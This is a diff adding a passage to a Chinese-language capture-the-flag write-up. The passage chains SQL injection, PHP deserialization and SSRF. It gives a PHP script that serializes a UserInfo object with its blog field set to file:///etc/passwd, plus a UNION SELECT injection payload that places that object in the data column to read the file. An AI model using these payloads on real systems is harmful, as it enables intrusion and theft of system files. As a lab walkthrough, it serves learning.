@@ -213,3 +213,22 @@ class UserInfo
 得到这个，就发现`data`字段是序列化存储的；报错也有反序列化失败，那想会不会存在反序列化漏洞
 ![](assets/Day%206/file-20251224183534546.png)
 我们再联想一下前面发现疑似SSRF的，它本身不能填file协议，那如果我们反序列化更改填入的blog，换成其他协呢？
+exp:
+```php
+<?php
+class UserInfo
+{
+    public $name = "1";
+    public $age = 12;
+    public $blog = "file:///etc/passwd";
+}
+
+$userInfo = new UserInfo();
+echo serialize($userInfo);
+```
+我们上面的注入过程知道了第四个是`data`的位置，那我们试试在第4个位置注入我们的payload：
+```http
+?no=0 unioN/**/ select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:12;s:4:"blog";s:18:"file:///etc/passwd";}' #
+```
+![](assets/Day%206/file-20251224184545970.png)
+看到常规读到。这里这个sql注入+php反序列化+ssrf还是很有意思
